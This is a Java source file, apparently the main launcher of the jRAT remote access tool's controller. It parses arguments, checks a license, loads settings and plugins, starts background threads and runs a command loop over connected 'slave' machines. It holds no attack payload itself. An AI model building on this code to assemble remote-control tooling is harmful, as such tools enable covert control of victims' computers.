package io.jrat.controller;

import io.jrat.common.Logger;
import io.jrat.common.Version;
import io.jrat.common.utils.Utils;
import io.jrat.controller.addons.Plugins;
import io.jrat.controller.commands.DefaultCommands;
import io.jrat.controller.settings.AbstractStorable;
import io.jrat.controller.settings.Settings;
import io.jrat.controller.settings.StatisticsCountry;
import io.jrat.controller.threads.NetworkCounter;
import io.jrat.controller.threads.RunnableCheckPlugins;
import io.jrat.controller.threads.ThreadCheckVersion;
import io.jrat.controller.threads.ThreadPing;
import io.jrat.controller.threads.ThreadTransferSpeed;
import io.jrat.controller.ui.dialogs.DialogEula;
import io.jrat.controller.ui.frames.Frame;
import io.jrat.controller.utils.IOUtils;
import io.jrat.controller.utils.TrayIconUtils;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import javax.swing.JOptionPane;
import javax.swing.UIManager;
import jrat.api.commands.Commands;
import oslib.OperatingSystem;

public class Main {
	
	public static final long START_TIME = System.currentTimeMillis();
	
	public static final String TERMINAL_PREFIX = "> ";

	public static boolean debug;
	public static boolean hideTitle;
	public static boolean headless;

	public static final List<AbstractSlave> connections = new ArrayList<AbstractSlave>();
	public static Frame instance;

	public static void main(String[] args) throws Exception {	
		System.out.println("jRAT " + Version.getVersion() + " " + DateFormat.getDateInstance(DateFormat.SHORT).format(new Date()));
		
		debug = argsContains(args, "--debug");

		Logger.log("Loading libraries...");
		try {
			Plugins.loadLibs();
		} catch (Exception e) {
			e.printStackTrace();
		}

		if (argsContains(args, "--genkey")) {
			Logger.log("Generating key");
			File file = Globals.getKeyFile();
			FileOutputStream out = new FileOutputStream(file);
			out.write(UniqueId.generateBinary());
			out.close();
			Logger.log("Wrote key to " + file.getAbsolutePath());
			System.exit(0);
		}

		final String sampleConfigPath = getArg(args, "--dump-default-config");

		if (argsContains(args, "--dump-default-config") || sampleConfigPath != null) {
			Settings settings = new Settings() {
				@Override
				public File getFile() {
					if (sampleConfigPath == null) {
						return super.getFile();
					} else {
						return new File(sampleConfigPath);
					}
				}
			};
			settings.addDefault();
			settings.save();
		}

		hideTitle = argsContains(args, "--hidetitle");

		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
			if (!argsContains(args, "--nomenubar")) {
				System.setProperty("apple.laf.useScreenMenuBar", "true");
			}
			
			System.setProperty("com.apple.mrj.application.apple.menu.about.name", Constants.NAME);
		}
		
		Globals.mkdirs();

		Settings.getGlobal().load();

		try {
			String theme = (String) Settings.getGlobal().get("theme");

			if (theme == null) {
				UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
			} else {
				UIManager.setLookAndFeel(theme);
			}
		} catch (Exception ex) {
			Logger.warn("Could not use LAF " + Settings.getGlobal().get(Settings.KEY_LAF) + ", setting default system LAF");
			ex.printStackTrace();
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}
		
		try {
			boolean validated = UniqueId.validate(argsContains(args, "--showhexkey"));

			if (!validated) {
				throw new Exception();
			}
		} catch (Exception ex) {
			if (debug) {
				ex.printStackTrace();
			}
			
			JOptionPane.showMessageDialog(null, Constants.NAME + " is limited, no license detected", Constants.NAME, JOptionPane.ERROR_MESSAGE);
			System.exit(0);
			return;
		}

		System.setProperty("jrat.theme", "true");
		System.setProperty("jrat.version", Version.getVersion());

		try {
			Plugins.init();
		} catch (Exception e) {
			e.printStackTrace();
		}

		StatisticsCountry.getGlobal().load();

		headless = argsContains(args, "-h", "--headless") || Utils.isHeadless();
		
		if (!headless) {
			instance = new Frame();
			instance.setVisible(true);
		}

		Settings.getGlobal().loadSockets();

		AbstractStorable.loadAllGlobals();

		boolean hasShownEULA = Settings.getGlobal().getBoolean(Settings.KEY_HAS_SHOWN_EULA);
		if (!hasShownEULA) {
			if (!headless) {
				DialogEula frame = new DialogEula(false);
				frame.setVisible(true);
			} else {
				System.out.println(IOUtils.readString(Main.class.getResourceAsStream("/files/eula.txt")).replace("Version", Version.getVersion()));
			}
		}

		Logger.log("Starting threads...");
		new Thread(new NetworkCounter()).start();
		new ThreadCheckVersion().start();
		new Thread(new RunnableCheckPlugins()).start();
		new ThreadPing().start();
		new ThreadTransferSpeed().start();


		Logger.log("Loading tray icon...");
		TrayIconUtils.initialize();

		if (Globals.getLockFile().exists()) {
			Logger.log("Lockfile already exists, we did not exit correctly");
		} else {
			Logger.log("Writing lockfile...");
			Globals.getLockFile().createNewFile();
		}

		Runtime.getRuntime().addShutdownHook(new Thread(new ShutdownHook()));

		DefaultCommands.addDefault();

		System.out.print(TERMINAL_PREFIX);

		BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
		String s;

		while ((s = reader.readLine()) != null) {
			Commands.execute(s, System.out);
			System.out.print(TERMINAL_PREFIX);
		}
	}

	public static boolean argsContains(String[] args, String... keys) {
		for (String str : args) {
			for (String key : keys) {
				if (str.equalsIgnoreCase(key)) {
					return true;
				}
			}
		}

		return false;
	}

	public static String getArg(String[] args, String... keys) {
		for (int i = 0; i < args.length; i++) {
			for (String key : keys) {
				if (args[i].equalsIgnoreCase(key)) {
					return args[i + 1];
				}
			}
		}

		return null;
	}

	/**
	 * @return the window title to show
	 */
	public static String formatTitle() {
		if (hideTitle) {
			return Constants.NAME;
		}
		
		return Constants.NAME + " [" + connections.size() + "] " + Version.getVersion();
	}
}
